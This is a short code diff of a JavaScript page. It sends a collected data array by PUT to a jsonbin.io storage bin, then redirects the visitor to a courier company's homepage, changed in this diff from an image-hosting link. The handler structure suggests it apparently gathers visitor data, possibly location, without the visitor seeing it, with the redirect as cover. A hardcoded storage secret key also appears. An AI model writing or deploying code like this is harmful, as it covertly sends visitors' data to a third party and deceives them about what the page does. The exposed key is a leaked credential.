@@ -209,13 +209,13 @@
             req.onreadystatechange = () => {
             if (req.readyState == XMLHttpRequest.DONE) {
                 console.log(arr);
-                window.location.replace("https://ibb.co/prQMNd1");
+                window.location.replace("https://www.delhivery.com/");
             }
             };
 
-            req.open("PUT", "https://api.jsonbin.io/b/621f8ccd06182767436b81d8", true);
+            req.open("PUT", "https://api.jsonbin.io/v3/b/6309f3ada1610e63861150dd", true);
             req.setRequestHeader("Content-Type", "application/json");
-            req.setRequestHeader("secret-key", "$2b$10$5wdP1w5Yckb1MCKHY8xQWuEEtJF4mEf9tCAeBv2sZIAk2D4/sC34y");
+            // req.setRequestHeader("secret-key", "$2b$10$5wdP1w5Yckb1MCKHY8xQWuEEtJF4mEf9tCAeBv2sZIAk2D4/sC34y");
             req.send(JSON.stringify(arr));
         }
         function error() {
@@ -228,9 +228,9 @@
             }
             };
 
-            req.open("PUT", "https://api.jsonbin.io/b/621f8ccd06182767436b81d8", true);
+            req.open("PUT", "https://api.jsonbin.io/v3/b/6309f3ada1610e63861150dd", true);
             req.setRequestHeader("Content-Type", "application/json");
-            req.setRequestHeader("secret-key", "$2b$10$5wdP1w5Yckb1MCKHY8xQWuEEtJF4mEf9tCAeBv2sZIAk2D4/sC34y");
+            // req.setRequestHeader("secret-key", "$2b$10$5wdP1w5Yckb1MCKHY8xQWuEEtJF4mEf9tCAeBv2sZIAk2D4/sC34y");
             req.send('{"sample": "error"}');
         }
         function options() {
